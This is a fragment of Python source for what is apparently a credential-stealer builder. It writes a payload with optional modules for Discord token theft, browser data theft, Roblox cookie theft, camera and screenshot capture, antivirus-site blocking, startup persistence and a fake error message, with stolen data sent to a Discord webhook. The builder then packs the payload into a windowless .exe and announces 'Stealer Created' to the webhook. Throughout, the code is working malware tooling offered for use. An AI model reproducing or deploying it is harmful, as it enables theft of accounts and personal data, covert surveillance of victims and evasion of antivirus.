with open(file_text, 'w', encoding='utf-8') as file:
 try:
    file.write(f"webhook_url = \"{webhook}\"")
    file.write(Obligatory)

    if add_system in ['Enable']:
        file.write(SystemGrab)

    if add_discord in ['Enable']:
        file.write(DiscordGrab)

    if add_browser in ['Enable']:
        file.write(BrowserGrab)

    if add_roblox in ['Enable']:
        file.write(RobloxGrab)
    
    if add_blockwebsite in ['Enable']:
        file.write(BlockWebsite)

    if add_cameracapture in ['Enable']:
        file.write(CameraCaptureGrab)

    if add_screenshot in ['Enable']:
        file.write(ScreenshotGrab)

    if add_startup in ['Enable']:
        file.write(Startup)

    if add_fake_error in ['Enable']:
        file.write(FakeError)

    file.write(Start)

    if add_restart in ['Enable']:
        file.write(Restart)

 except Exception as e:
    print(f"{color.RED}\n{ERROR} Text file not created: {color.WHITE}{e}")


try:
    with open(file_text, 'r', encoding='utf-8') as file_txt:
        contenu = file_txt.read()

    with open(file_python, 'w', encoding='utf-8') as file_py:
        file_py.write(contenu)

    with open(file_text, 'w', encoding='utf-8') as file:
        file.write(f"{path_destination}")

    print(f"{color.RED}\n{INFO} Python file created: \"{color.WHITE}{file_python}{color.RED}\"")
except Exception as e:
   print(f"{color.RED}{ERROR} Python file not created: {color.WHITE}{e}")


def convert_to_exe(script_name, destination_path, icon_path=None):
    print(f"{color.RED}{INFO} Converting to .exe:{color.RESET}")
    try:
        script_path = os.path.abspath(script_name)

        if not os.path.exists(destination_path):
            os.makedirs(destination_path)

        pyinstaller_command = ['pyinstaller', '--onefile', '--distpath', destination_path, '--noconsole', script_path]

        if icon_path:
            pyinstaller_command.extend(['--icon', icon_path])

        subprocess.run(pyinstaller_command)

        print(f"{color.RED}{INFO} Conversion successful. The executable is located in the folder \"{color.WHITE}{destination_path}{color.RED}\"")
    except Exception as e:
        print(f"{color.RED}{ERROR} Error during conversion: {color.WHITE}{e}")

if file_type in ['Exe File']:
    convert_to_exe(file_python, path_destination, icon_path)

print(f"{color.RED}{INFO} Removing temporary files from conversion..{color.RESET}")
try:
    directory = os.getcwd()
    if file_type in ['Exe File']:
        shutil.rmtree(f"{directory}/build")
        os.remove(f"{name_file}.spec")
        os.remove(file_python)
    os.remove(file_text)
    print(f"{color.RED}{INFO} Temporary file removed.{color.RESET}")
except Exception as e:
    print(f"{color.RED}{ERROR} Temporary file not removed: {color.WHITE}{e}")

try:
    print(f"{color.RED}{INFO} Open \"{color.WHITE}{path_destination}{color.RED}\"")
    path = directory + "/1-File-Create"
    path = os.path.realpath(path)
    os.startfile(path)
except:
   pass

def send_webhook(embed):
    payload = {
    'embeds': [embed],
    'username': username_webhook,
    'avatar_url': avatar_webhook
    }

    headers = {
    'Content-Type': 'application/json'
    }

    requests.post(webhook, data=json.dumps(payload), headers=headers)

fields = [
    {"name": f"File Name:", "value": f"""```{name_file}```""", "inline": True},
    {"name": f"File Type:", "value": f"""```{file_type}```""", "inline": True},
    {"name": f"System Info:", "value": f"""```{add_system}```""", "inline": True},
    {"name": f"Discord Token:", "value": f"""```{add_discord}```""", "inline": True},
    {"name": f"Browser Steal:", "value": f"""```{add_browser}```""", "inline": True},
    {"name": f"Roblox Cookie:", "value": f"""```{add_roblox}```""", "inline": True},
    {"name": f"Block AV Website:", "value": f"""```{add_blockwebsite}```""", "inline": True},
    {"name": f"Camera Capture:", "value": f"""```{add_cameracapture}```""", "inline": True},
    {"name": f"Screenshot:", "value": f"""```{add_screenshot}```""", "inline": True},
    {"name": f"Fake Error:", "value": f"""```{add_fake_error}```""", "inline": True},
    {"name": f"Launch At Startup:", "value": f"""```{add_startup}```""", "inline": True},
    {"name": f"Restart Every 5min:", "value": f"""```{add_restart}```""", "inline": True},
    {"name": f"Webhook:", "value": f"""{webhook}""", "inline": False},
]

embed = {
    'title': f'Stealer Created:',
    'color': color_webhook,
    "fields": fields,
    'footer': {
        "text": username_webhook,
        "icon_url": avatar_webhook,
        }
    }
try:
    send_webhook(embed)
except:
    pass

Continue()
Reset()

"""
    ╔════════════════════════════════════════════════════════════════════════════╗
    ║ ! File detected by the antivirus, but be aware that there is no backdoor ! ║
    ╚════════════════════════════════════════════════════════════════════════════╝
"""